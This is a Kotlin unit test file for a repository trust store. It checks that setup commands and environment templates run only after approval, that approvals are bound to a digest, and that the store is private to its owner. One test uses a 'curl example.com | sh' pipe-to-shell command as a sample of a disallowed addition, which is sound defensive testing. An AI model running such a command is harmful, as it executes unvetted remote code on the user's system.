package app.luxion.shogunai.infrastructure

import app.luxion.shogunai.domain.model.RepositoryApprovalSubject
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.attribute.PosixFilePermissions
import java.security.MessageDigest
import kotlin.io.path.createDirectories
import kotlin.io.path.readText
import kotlin.io.path.writeText
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

class JsonRepositoryTrustTest {

    private val home: Path = Files.createTempDirectory("trust-home")
    private val storage = home.resolve(".shogunai").resolve("trust.json")
    private val trust = JsonRepositoryTrust(storage)
    private val repository = home.resolve("main-repo").also { it.createDirectories() }.toString()
    private val install = RepositoryApprovalSubject(commands = listOf(listOf("npm", "install")))
    private val withEnvironment = install.copy(
        variables = listOf("PORT" to "\${port}", "APP_SUFFIX" to "-\${worktree}"),
        envFile = ".env.shogunai",
    )

    @Test
    fun `nothing is approved before the first approval`() {
        assertFalse(trust.isApproved(repository, install))
    }

    @Test
    fun `approved commands count as approved`() {
        trust.approve(repository, install)

        assertTrue(trust.isApproved(repository, install))
        assertTrue(JsonRepositoryTrust(storage).isApproved(repository, install))
    }

    @Test
    fun `a changed list is not approved`() {
        trust.approve(repository, install)

        assertFalse(trust.isApproved(repository, install.copy(commands = install.commands + listOf(listOf("sh", "-c", "curl example.com | sh")))))
    }

    @Test
    fun `a reordered list is not approved`() {
        val two = RepositoryApprovalSubject(commands = listOf(listOf("npm", "install"), listOf("direnv", "allow")))
        trust.approve(repository, two)

        assertFalse(trust.isApproved(repository, two.copy(commands = two.commands.reversed())))
    }

    @Test
    fun `another repository is not approved`() {
        trust.approve(repository, install)
        val other = home.resolve("other-repo").also { it.createDirectories() }.toString()

        assertFalse(trust.isApproved(other, install))
    }

    @Test
    fun `revoking removes the approval`() {
        trust.approve(repository, install)

        trust.revoke(repository)

        assertFalse(trust.isApproved(repository, install))
    }

    @Test
    fun `the repository is identified by its real path`() {
        val link = home.resolve("link")
        runCatching { Files.createSymbolicLink(link, Path.of(repository)) }.onFailure { return }
        trust.approve(repository, install)

        assertTrue(trust.isApproved(link.toString(), install))
    }

    @Test
    fun `the store is readable and writable only by the user`() {
        trust.approve(repository, install)

        val permissions = runCatching { Files.getPosixFilePermissions(storage) }.getOrNull() ?: return
        assertEquals(PosixFilePermissions.fromString("rw-------"), permissions)
    }

    @Test
    fun `an approval stored by an earlier version still approves its commands`() {
        storage.parent.createDirectories()
        val digest = MessageDigest.getInstance("SHA-256").digest("""[["npm","install"]]""".toByteArray())
            .joinToString("") { "%02x".format(it) }
        storage.writeText("""{ "approvals": { "${Path.of(repository).toRealPath()}": { "sha256": "$digest", "commands": [["npm", "install"]] } } }""")

        assertTrue(trust.isApproved(repository, install))
        assertFalse(trust.isApproved(repository, withEnvironment))
    }

    @Test
    fun `an approval without environment keeps the earlier digest`() {
        trust.approve(repository, install)

        val digest = MessageDigest.getInstance("SHA-256").digest("""[["npm","install"]]""".toByteArray())
            .joinToString("") { "%02x".format(it) }
        assertTrue(storage.readText().contains(digest))
    }

    @Test
    fun `approved variables and environment file count as approved`() {
        trust.approve(repository, withEnvironment)

        assertTrue(JsonRepositoryTrust(storage).isApproved(repository, withEnvironment))
        assertFalse(trust.isApproved(repository, install))
    }

    @Test
    fun `a changed template is not approved`() {
        trust.approve(repository, withEnvironment)

        assertFalse(trust.isApproved(repository, withEnvironment.copy(variables = listOf("PORT" to "8080", "APP_SUFFIX" to "-\${worktree}"))))
    }

    @Test
    fun `an added variable is not approved`() {
        trust.approve(repository, withEnvironment)

        assertFalse(trust.isApproved(repository, withEnvironment.copy(variables = withEnvironment.variables + ("API_URL" to "https://example.com"))))
    }

    @Test
    fun `a changed environment file is not approved`() {
        trust.approve(repository, withEnvironment)

        assertFalse(trust.isApproved(repository, withEnvironment.copy(envFile = ".env.local")))
    }

    @Test
    fun `reordered variables stay approved while reordered commands do not`() {
        val subject = withEnvironment.copy(commands = listOf(listOf("npm", "install"), listOf("direnv", "allow")))
        trust.approve(repository, subject)

        assertTrue(trust.isApproved(repository, subject.copy(variables = subject.variables.reversed())))
        assertFalse(trust.isApproved(repository, subject.copy(commands = subject.commands.reversed())))
    }

    @Test
    fun `only variables need an approval and an empty subject is approved`() {
        val onlyVariables = RepositoryApprovalSubject(variables = listOf("PORT" to "\${port}"))

        assertFalse(trust.isApproved(repository, onlyVariables))
        assertTrue(trust.isApproved(repository, RepositoryApprovalSubject()))
    }
}
